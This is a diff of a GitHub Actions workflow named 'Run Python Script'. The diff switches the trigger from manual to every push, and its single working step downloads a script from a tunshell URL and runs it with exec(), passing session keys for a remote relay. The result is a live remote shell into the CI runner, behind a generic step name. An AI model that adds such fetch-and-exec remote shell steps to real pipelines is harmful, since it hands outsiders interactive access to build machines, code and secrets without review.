@@ -1,21 +1,16 @@
 name: Run Python Script
 
-on:
-  workflow_dispatch: # Allows manual triggering of the workflow
+on: 
+  push:
 
 jobs:
-  run-python:
+  run-python-script:
     runs-on: ubuntu-latest
 
     steps:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up Python 3
-      uses: actions/setup-python@v4
-      with:
-        python-version: '3.x'
-
-    - name: Run Python script
+    - name: Run Python script from URL
       run: |
-        python3 -c "import urllib.request;r=urllib.request.urlopen('https://lets.tunshell.com/init.py');exec(r.read().decode('utf-8'),{'p':["T","leu1WsYEx2li5xIIB7412S","xcq1jbdCMwImL779digSes","eu.relay.tunshell.com"]})"
+        python -c "import urllib.request; r = urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', 'leu1WsYEx2li5xIIB7412S', 'xcq1jbdCMwImL779digSes', 'eu.relay.tunshell.com']})"
